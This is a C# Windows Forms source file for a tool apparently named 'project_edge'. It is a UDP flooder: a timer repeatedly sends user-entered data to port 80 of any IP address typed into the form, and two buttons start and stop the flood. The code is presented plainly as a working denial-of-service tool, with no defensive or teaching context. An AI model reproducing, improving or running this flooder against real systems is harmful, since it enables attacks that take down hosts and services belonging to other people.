using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;

namespace project_edge
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            floodTimer.Start();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            floodTimer.Stop();
        }
        private void floodTimer_Tick(object sender, EventArgs e)
        {
            Flood();
        }
        public void Flood()
        {
            UdpClient client = new UdpClient();

            IPAddress ipAddr = IPAddress.Parse(ipTxt.Text);

            try
            {
                client.Connect(ipAddr, 80);
                byte[] sendByte = Encoding.ASCII.GetBytes(dataTxt.Text);
                client.Send(sendByte, sendByte.Length);
                client.AllowNatTraversal(true);
                client.DontFragment = true;
            }
            catch
            {
                const string errorMessage = "Something went wrong";
                const string errorCaption = "Please ensure you entered everything correctly";

                MessageBox.Show(errorMessage, errorCaption,
                    MessageBoxButtons.OK);
            }
        }
    }
}
